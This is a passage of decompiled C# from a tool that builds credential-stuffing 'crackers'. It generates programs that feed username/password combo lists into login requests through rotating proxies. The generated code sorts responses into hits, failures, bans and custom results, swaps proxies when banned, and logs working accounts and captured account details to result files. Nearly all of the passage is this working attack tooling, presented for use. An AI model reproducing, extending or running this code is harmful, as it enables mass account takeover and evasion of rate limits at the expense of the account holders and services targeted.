                                        streamWriter.WriteLine("            };");
                                        streamWriter.WriteLine("            string _responseKey = responseKeys.FirstOrDefault<string>(s => content.Contains(s));");
                                        streamWriter.WriteLine("            ");
                                        streamWriter.WriteLine("            switch(_responseKey)");
                                        streamWriter.WriteLine("            {");
                                        flag10 = true;
                                    }
                                }
                            }
                            foreach (KeyValuePair<string, int> keyValuePair13 in Config.Requests)
                            {
                                if (keyValuePair13.Value == 2)
                                {
                                    if (keyValuePair13.Key.Contains("KEY] "))
                                    {
                                        if (keyValuePair13.Key.Contains("SUCCESS"))
                                        {
                                            string str21 = keyValuePair13.Key.Split(new string[]
                                            {
                                                " KEY] "
                                            }, StringSplitOptions.None)[1];
                                            streamWriter.WriteLine("            case \"" + str21 + "\":");
                                            streamWriter.WriteLine("              Console.ForegroundColor = ConsoleColor.Green;");
                                            streamWriter.WriteLine("              Console.WriteLine(\"[HIT]. {0}\", Combo);");
                                            streamWriter.WriteLine("              Console.ResetColor();");
                                            streamWriter.WriteLine("              Program.Hits++; Program.Checked++;");
                                            streamWriter.WriteLine("              proxyAddress.FinishedUsingProxy();");
                                            foreach (KeyValuePair<string, int> keyValuePair14 in Config.Requests)
                                            {
                                                if (keyValuePair14.Key.Contains("[PARSE CAPTURE]") && keyValuePair14.Value == 2)
                                                {
                                                    string text54 = keyValuePair14.Key.Split(new string[]
                                                    {
                                                        "RSE CAPTURE] "
                                                    }, StringSplitOptions.None)[1];
                                                    string text55 = text54.Split(new string[]
                                                    {
                                                        ": "
                                                    }, StringSplitOptions.None)[0];
                                                    string text56 = text54.Split(new string[]
                                                    {
                                                        ": "
                                                    }, StringSplitOptions.None)[1];
                                                    string text57 = text55.Replace(" ", "");
                                                    if (text55.Contains(" "))
                                                    {
                                                        num2++;
                                                        streamWriter.WriteLine(string.Concat(new object[]
                                                        {
                                                            "              string ",
                                                            text57,
                                                            num2,
                                                            " = \"",
                                                            text57,
                                                            ": \" + Regex.Match(content, \"",
                                                            text56,
                                                            "\").Groups[1].ToString(); "
                                                        }));
                                                        string str22 = text57 + num2;
                                                        if (flag7)
                                                        {
                                                            text = text + " + " + str22;
                                                        }
                                                    }
                                                    else
                                                    {
                                                        num2++;
                                                        streamWriter.WriteLine(string.Concat(new object[]
                                                        {
                                                            "              string ",
                                                            text55,
                                                            num2,
                                                            " = \"",
                                                            text55,
                                                            ": \" +  Regex.Match(content, \"",
                                                            text56,
                                                            "\").Groups[1].ToString(); "
                                                        }));
                                                        string str23 = text57 + num2;
                                                        text = text + " + " + str23;
                                                    }
                                                }
                                            }
                                            if (num2 > 0)
                                            {
                                                streamWriter.WriteLine("            string a" + num3 + " = \"Capture: \";");
                                                streamWriter.WriteLine(string.Concat(new object[]
                                                {
                                                    "            string s",
                                                    num3,
                                                    " = ",
                                                    text,
                                                    ";"
                                                }));
                                                streamWriter.WriteLine("            Save(Combo, s" + num3 + ", 2);");
                                                num3++;
                                                text = "a" + num3;
                                            }
                                            else
                                            {
                                                num3++;
                                                streamWriter.WriteLine("            Save(Combo, \"\", 1);");
                                            }
                                            streamWriter.WriteLine("            break;");
                                            streamWriter.WriteLine("            ");
                                        }
                                        else if (keyValuePair13.Key.Contains("FAILURE"))
                                        {
                                            string str24 = keyValuePair13.Key.Split(new string[]
                                            {
                                                " KEY] "
                                            }, StringSplitOptions.None)[1];
                                            streamWriter.WriteLine("            case \"" + str24 + "\":");
                                            streamWriter.WriteLine("              Program.Checked++;");
                                            streamWriter.WriteLine("              Console.ForegroundColor = ConsoleColor.Red;");
                                            streamWriter.WriteLine("              Console.WriteLine(\"[Failed]. {0} WITH {1}\", Combo, proxyAddress.Proxy);");
                                            streamWriter.WriteLine("              Console.ResetColor();");
                                            streamWriter.WriteLine("              proxyAddress.FinishedUsingProxy();");
                                            streamWriter.WriteLine("            break;");
                                            streamWriter.WriteLine("            ");
                                        }
                                        else if (keyValuePair13.Key.Contains("CUSTOM"))
                                        {
                                            string str25 = keyValuePair13.Key.Split(new string[]
                                            {
                                                " KEY] "
                                            }, StringSplitOptions.None)[1];
                                            streamWriter.WriteLine("            case \"" + str25 + "\":");
                                            streamWriter.WriteLine("              Program.Hits++;");
                                            streamWriter.WriteLine("              Program.Checked++;");
                                            streamWriter.WriteLine("              Console.ForegroundColor = ConsoleColor.Blue;");
                                            streamWriter.WriteLine("              Console.WriteLine(\"[Custom]. {0}\", Combo);");
                                            streamWriter.WriteLine("              Console.ResetColor();");
                                            streamWriter.WriteLine("              proxyAddress.FinishedUsingProxy();");
                                            streamWriter.WriteLine("              Save(Combo, \"\", 4);");
                                            streamWriter.WriteLine("            break;");
                                            streamWriter.WriteLine("            ");
                                        }
                                        else if (keyValuePair13.Key.Contains("BAN"))
                                        {
                                            string str26 = keyValuePair13.Key.Split(new string[]
                                            {
                                                " KEY] "
                                            }, StringSplitOptions.None)[1];
                                            streamWriter.WriteLine("            case \"" + str26 + "\":");
                                            streamWriter.WriteLine("              Console.ForegroundColor = ConsoleColor.Yellow;");
                                            streamWriter.WriteLine("              Console.WriteLine(\"[Ban]. {0} - {1}\", Combo, proxyAddress.Proxy);");
                                            streamWriter.WriteLine("              Console.ResetColor();");
                                            streamWriter.WriteLine("              proxyAddress.BanProxyUsage();");
                                            streamWriter.WriteLine("              proxyAddress.FinishedUsingProxy();");
                                            streamWriter.WriteLine("              Program.Start(Combo);");
                                            streamWriter.WriteLine("            break;");
                                            streamWriter.WriteLine("            ");
                                        }
                                    }
                                    flag11 = true;
                                }
                            }
                            if (flag11)
                            {
                                streamWriter.WriteLine("            default:");
                                streamWriter.WriteLine("              Console.WriteLine(\"Default\");");
                                streamWriter.WriteLine("              proxyAddress.BanProxyUsage();");
                                streamWriter.WriteLine("              proxyAddress.FinishedUsingProxy();");
                                streamWriter.WriteLine("              if(content.Length > 10){ Save(Combo, content, 3); }");
                                streamWriter.WriteLine("              ");
                                streamWriter.WriteLine("              Program.Start(Combo);");
                                streamWriter.WriteLine("            break;");
                                streamWriter.WriteLine("            }");
                            }
                        }
                        streamWriter.WriteLine("            }catch(Exception e)");
                        streamWriter.WriteLine("            {");
                        streamWriter.WriteLine("            Console.WriteLine(e.Message);");
                        streamWriter.WriteLine("            proxyAddress.BanProxyUsage();");
                        streamWriter.WriteLine("            proxyAddress.FinishedUsingProxy();");
                        streamWriter.WriteLine("            }");
                        streamWriter.WriteLine("            proxyAddress.FinishedUsingProxy();");
                        streamWriter.WriteLine("        }");
                        streamWriter.WriteLine("        public static string ReadyPostData(string postData, string Username, string Password)");
                        streamWriter.WriteLine("        {");
                        streamWriter.WriteLine("            Regex regex = new Regex(\"<USER>\");");
                        streamWriter.WriteLine("            string apple = regex.Replace(postData, Username);");
                        streamWriter.WriteLine("            Regex regex2 = new Regex(\"<PASS>\");");
                        streamWriter.WriteLine("            apple = regex2.Replace(apple, Password);");
                        streamWriter.WriteLine("            return apple;");
                        streamWriter.WriteLine("        }");
                        streamWriter.WriteLine("        public static void Save(string Combo, string message, int x)");
                        streamWriter.WriteLine("        {");
                        streamWriter.WriteLine("           if(x == 1){");
                        streamWriter.WriteLine("           lock (LOCKER)");
                        streamWriter.WriteLine("              {");
                        streamWriter.WriteLine("                  using (FileStream file = new FileStream(\"Results\\\\Hits.txt\", FileMode.Append, FileAccess.Write, FileShare.None))");
                        streamWriter.WriteLine("                  {");
                        streamWriter.WriteLine("                       using (StreamWriter writer = new StreamWriter(file))");
                        streamWriter.WriteLine("                       {    ");
                        streamWriter.WriteLine("        writer.WriteLine(Combo);");
                        streamWriter.WriteLine("        file.Flush();");
                        streamWriter.WriteLine("        }}}}");
                        streamWriter.WriteLine("        else if(x == 2){");
                        streamWriter.WriteLine("           lock (LOCKER)");
                        streamWriter.WriteLine("              {");
                        streamWriter.WriteLine("                  using (FileStream file = new FileStream(\"Results\\\\Capture.txt\", FileMode.Append, FileAccess.Write, FileShare.None))");
                        streamWriter.WriteLine("                  {");
                        streamWriter.WriteLine("                       using (StreamWriter writer = new StreamWriter(file))");
                        streamWriter.WriteLine("                       {    ");
                        streamWriter.WriteLine("        writer.WriteLine(Combo + \" - \" + message);");
                        streamWriter.WriteLine("        file.Flush();");
                        streamWriter.WriteLine("        }}}}");
                        streamWriter.WriteLine("        else if(x == 3){");
                        streamWriter.WriteLine("           lock (LOCKER)");
                        streamWriter.WriteLine("              {");
                        streamWriter.WriteLine("                  using (FileStream file = new FileStream(\"Results\\\\DEBUG_LOG.txt\", FileMode.Append, FileAccess.Write, FileShare.None))");
                        streamWriter.WriteLine("                  {");
                        streamWriter.WriteLine("                       using (StreamWriter writer = new StreamWriter(file))");
                        streamWriter.WriteLine("                       {    ");
                        streamWriter.WriteLine("        writer.WriteLine(Combo + \" - \" + message);");
                        streamWriter.WriteLine("        file.Flush();");
                        streamWriter.WriteLine("        }}}}");
                        streamWriter.WriteLine("        else if(x == 4){");
                        streamWriter.WriteLine("           lock (LOCKER)");
                        streamWriter.WriteLine("              {");
                        streamWriter.WriteLine("                  using (FileStream file = new FileStream(\"Results\\\\Custom.txt\", FileMode.Append, FileAccess.Write, FileShare.None))");
                        streamWriter.WriteLine("                  {");
                        streamWriter.WriteLine("                       using (StreamWriter writer = new StreamWriter(file))");
                        streamWriter.WriteLine("                       {    ");
                        streamWriter.WriteLine("        writer.WriteLine(Combo + \" - \" + message);");
                        streamWriter.WriteLine("        file.Flush();");
                        streamWriter.WriteLine("        }}}}");
                        streamWriter.WriteLine("        ");
                        streamWriter.WriteLine("        ");
                        streamWriter.WriteLine("        }");
                        streamWriter.WriteLine("        ");
                        streamWriter.WriteLine("        ");
                        streamWriter.WriteLine("        ");
                        streamWriter.WriteLine("    ");
                        streamWriter.WriteLine("");
                    }
                }
            }
        }

        // Token: 0x0600002C RID: 44 RVA: 0x00005BC8 File Offset: 0x00003DC8
        public static void WriteNamespaces(string projectNamespace, string fileName, object LOCKER)
        {
            lock (LOCKER)
            {
                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write, FileShare.None))
                {
                    using (StreamWriter streamWriter = new StreamWriter(fileStream))
                    {
                        streamWriter.WriteLine("using System;");
                        streamWriter.WriteLine("using System.Diagnostics;");
                        streamWriter.WriteLine("using System.Linq;");
                        streamWriter.WriteLine("using System.Threading;");
                        streamWriter.WriteLine("using System.Net;");
                        streamWriter.WriteLine("using System.IO;");
                        streamWriter.WriteLine("using System.Collections.Generic;");
                        streamWriter.WriteLine("using System.Text;");
                        streamWriter.WriteLine("using System.Threading.Tasks;");
                        streamWriter.WriteLine("using System.Text.RegularExpressions;");
                        streamWriter.WriteLine("using RestSharp;");
                        streamWriter.WriteLine("namespace " + projectNamespace);
                        streamWriter.WriteLine("{");
                        streamWriter.WriteLine("");
                    }
                }
            }
        }

        // Token: 0x0600002D RID: 45 RVA: 0x00005CDC File Offset: 0x00003EDC
        public static void WriteClassStructure(string className, string fileName, object LOCKER)
        {
            lock (LOCKER)
            {
                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write, FileShare.None))
                {
                    using (StreamWriter streamWriter = new StreamWriter(fileStream))
                    {
                        streamWriter.WriteLine("    class " + className);
                        streamWriter.WriteLine("    {");
                    }
                }
            }
        }

        // Token: 0x0600002E RID: 46 RVA: 0x00005D6C File Offset: 0x00003F6C
        public static void EndFile(string fileName, object LOCKER)
        {
            lock (LOCKER)
            {
                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write, FileShare.None))
                {
                    using (StreamWriter streamWriter = new StreamWriter(fileStream))
                    {
                        streamWriter.WriteLine("");
                        streamWriter.WriteLine("     }");
                        streamWriter.WriteLine("}");
                    }
                }
            }
        }

        // Token: 0x0600002F RID: 47 RVA: 0x00005E00 File Offset: 0x00004000
        public static void WriteVariables(string fileName, object LOCKER)
        {
            lock (LOCKER)
            {
                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write, FileShare.None))
                {
                    using (StreamWriter streamWriter = new StreamWriter(fileStream))
                    {
                        streamWriter.WriteLine("public static ProxyHandler proxyHandler = new ProxyHandler(Load.proxyHandlerList);");
                        streamWriter.WriteLine("public static int Hits, Checked, Failed, CPM, CPMTimer;");
                        streamWriter.WriteLine("");
                    }
                }
            }
        }

        // Token: 0x06000030 RID: 48 RVA: 0x00005E94 File Offset: 0x00004094
        public static void WriteProgramCode(Config Instance, string fileName, object LOCKER)
        {
            lock (LOCKER)
            {
                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write, FileShare.None))
                {
                    using (StreamWriter streamWriter = new StreamWriter(fileStream))
                    {
                        streamWriter.WriteLine("        static void Main(string[] args)");
                        streamWriter.WriteLine("        {");
                        streamWriter.WriteLine("        Console.Title = \"[BY-G3V3R] " + Instance.ConfigName + " Hits: \"+Hits+\" Progression: \"+Checked+\"/\"+Load.combosList.Count()+\" [ CPM: \"+CPM+\" ]\";");
                        streamWriter.WriteLine("            Load.LoadFiles();");
                        streamWriter.WriteLine("            string val;");
                        streamWriter.WriteLine("            int res;");
                        streamWriter.WriteLine("            Console.Write(\"Thread Count: \");");
                        streamWriter.WriteLine("            val = Console.ReadLine();");
                        streamWriter.WriteLine("            res = Convert.ToInt32(val);");
                        streamWriter.WriteLine("            Thread menuUpdater;");
                        streamWriter.WriteLine("            menuUpdater = new Thread(new ThreadStart(CPMTICKER));");
                        streamWriter.WriteLine("             menuUpdater.Start();");
                        streamWriter.WriteLine("            ");
                        streamWriter.WriteLine("            Threading.Initialize(res, Start);");
                        streamWriter.WriteLine("            ");
                        streamWriter.WriteLine("            ");
                        streamWriter.WriteLine("            Console.ReadKey();");
                        streamWriter.WriteLine("        }");
                        streamWriter.WriteLine("        ");
                        streamWriter.WriteLine("        static void CPMTICKER()");
                        streamWriter.WriteLine("        {");
                        streamWriter.WriteLine("        Stopwatch sw = new Stopwatch();");
                        streamWriter.WriteLine("        sw.Start();");
                        streamWriter.WriteLine("        while (true)");
                        streamWriter.WriteLine("        {  if (sw.ElapsedMilliseconds > 10000 && sw.ElapsedMilliseconds < 10500){");
                        streamWriter.WriteLine("        CPM = CPMTimer * 6;");
                        streamWriter.WriteLine("        CPMTimer = 0;");
                        streamWriter.WriteLine("        sw.Reset();");
                        streamWriter.WriteLine("        sw.Start();");
                        streamWriter.WriteLine("        Console.Clear();");
                        streamWriter.WriteLine("        }");
                        streamWriter.WriteLine("        Console.Title = \"[BY-G3V3R] " + Instance.ConfigName + " Hits: \"+Hits+\" Progression: \"+Checked+\"/\"+Load.combosList.Count()+\" [ CPM: \"+CPM+\" ]\";");
                        streamWriter.WriteLine("        }}");
                        streamWriter.WriteLine("        ");
                        streamWriter.WriteLine("        public static void Start(string Combo)");
                        streamWriter.WriteLine("        {");
                        streamWriter.WriteLine("            Proxies proxyAddress = proxyHandler.NewProxy();");
                        streamWriter.WriteLine("            Request.MakeRequest(Combo, proxyAddress);");
                        streamWriter.WriteLine("        }");
                        streamWriter.WriteLine("        ");
                        streamWriter.WriteLine("");
                    }
                }
            }
        }

        // Token: 0x06000031 RID: 49 RVA: 0x00006110 File Offset: 0x00004310
        public static void WriteThreadingCode(string fileName, object LOCKER)
        {
            foreach (string value in File.ReadAllLines("Server\\Resources\\Classes\\Threading.cs"))
            {
                lock (LOCKER)
                {
                    using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write, FileShare.None))
                    {
                        using (StreamWriter streamWriter = new StreamWriter(fileStream))
                        {
                            streamWriter.WriteLine(value);
                        }
                    }
                }
            }
        }

        // Token: 0x06000032 RID: 50 RVA: 0x000061B0 File Offset: 0x000043B0
        public static void WriteLoadingCode(string fileName, object LOCKER)
        {
            foreach (string value in File.ReadAllLines("Server\\Resources\\Classes\\Loading.cs"))
            {
                lock (LOCKER)
                {
                    using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write, FileShare.None))
                    {
                        using (StreamWriter streamWriter = new StreamWriter(fileStream))
                        {
                            streamWriter.WriteLine(value);
                        }
                    }
                }
            }
        }

       
        public static void WriteProxyClass(string nameSpace, Config Config, object LOCKER)
        {
            if (Config.NeedsProxies)
            {
                if (Config.MaxProxyUses == "0")
                {
                    Core.WriteNamespaces(nameSpace, "Server\\Crackers\\" + Config.ConfigName + "\\Classes\\TimeoutProxies.cs", LOCKER);
                    Core.ProxyTimeoutMethod(nameSpace, "Server\\Crackers\\" + Config.ConfigName + "\\Classes\\TimeoutProxies.cs", "900000", LOCKER);
                    Core.EndFile("Server\\Crackers\\" + Config.ConfigName + "\\Classes\\TimeoutProxies.cs", LOCKER);
                    return;
                }
                if (Config.MaxProxyUses != "0")
                {
                    Convert.ToInt32(Config.MaxProxyUses);
                    Core.WriteNamespaces(nameSpace, "Server\\Crackers\\" + Config.ConfigName + "\\Classes\\MaxTriesProxies.cs", LOCKER);
                    Core.ProxyMaxTries(nameSpace, "Server\\Crackers\\" + Config.ConfigName + "\\Classes\\MaxTriesProxies.cs", Config.MaxProxyUses, "900000", LOCKER);
                    Core.EndFile("Server\\Crackers\\" + Config.ConfigName + "\\Classes\\MaxTriesProxies.cs", LOCKER);
                    return;
                }
            }
            else if (!Config.NeedsProxies)
            {
                Core.WriteNamespaces(nameSpace, "Server\\Crackers\\" + Config.ConfigName + "\\Classes\\TimeoutProxies.cs", LOCKER);
                Core.ProxyTimeoutMethod(nameSpace, "Server\\Crackers\\" + Config.ConfigName + "\\Classes\\TimeoutProxies.cs", "900000", LOCKER);
                Core.EndFile("Server\\Crackers\\" + Config.ConfigName + "\\Classes\\TimeoutProxies.cs", LOCKER);
            }
        }

       
        public static void ProxyTimeoutMethod(string nameSpace, string fileName, string timeout, object LOCKER)
        {
            foreach (string text in File.ReadAllLines("Server\\Resources\\Classes\\TimeoutProxies.cs"))
            {
                lock (LOCKER)
                {
                    using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write, FileShare.None))
                    {
                        using (StreamWriter streamWriter = new StreamWriter(fileStream))
                        {
                            if (text.Contains("              this.Timeout = "))
                            {
                                streamWriter.WriteLine("              this.Timeout = " + timeout + ";");
                            }
                            else
                            {
                                streamWriter.WriteLine(text);
                            }
                        }
                    }
                }
            }
        }

       
        public static void ProxyMaxTries(string nameSpace, string fileName, string maxRetries, string timeout, object LOCKER)
        {
            foreach (string text in File.ReadAllLines("Server\\Resources\\Classes\\MaxTriesProxies.cs"))
            {
                lock (LOCKER)
                {
                    using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write, FileShare.None))
                    {
                        using (StreamWriter streamWriter = new StreamWriter(fileStream))
                        {
                            if (text.Contains("this.MaxTries = "))
                            {
                                streamWriter.WriteLine("        this.MaxTries = " + maxRetries + ";");
                            }
                            else if (text.Contains("\t\tthis.Timeout = "))
                            {
                                streamWriter.WriteLine("\t\tthis.Timeout = " + timeout + ";");
                            }
                            else
                            {
                                streamWriter.WriteLine(text);
                            }
                        }
                    }
                }
            }
        }
    }
}

